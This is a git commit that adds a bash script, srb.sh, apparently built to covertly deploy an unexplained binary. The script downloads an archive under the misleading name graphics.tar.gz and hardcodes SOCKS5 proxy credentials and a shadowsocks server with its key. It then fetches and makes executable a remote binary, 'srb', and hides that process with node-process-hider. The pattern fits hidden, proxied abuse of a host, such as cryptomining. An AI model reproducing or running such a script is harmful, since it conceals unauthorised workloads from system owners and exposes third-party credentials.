45d04b53fef1b7acd14e445fd6b8bf2a578401f4
nikikulone <109032903+nikikulone@users.noreply.github.com>
2022-07-16 03:56:45 +0700

    Create srb.sh

---
+++ srb.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+npm install -g npm
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
+chmod +x srb
+
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+
+ph add srb
